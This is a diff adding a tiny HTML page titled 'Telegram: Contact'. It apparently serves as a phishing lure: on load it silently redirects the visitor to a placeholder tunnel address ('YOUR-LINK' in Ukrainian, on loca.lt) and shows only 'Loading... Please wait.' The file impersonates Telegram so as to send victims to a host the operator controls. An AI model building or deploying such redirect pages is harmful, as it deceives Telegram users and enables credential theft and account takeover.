@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram: Contact</title>
+    <script>
+        window.location.href = "https://ТВОЄ-ПОСИЛАННЯ.loca.lt";
+    </script>
+</head>
+<body>
+    <p>Loading... Please wait.</p>
+</body>
+</html>
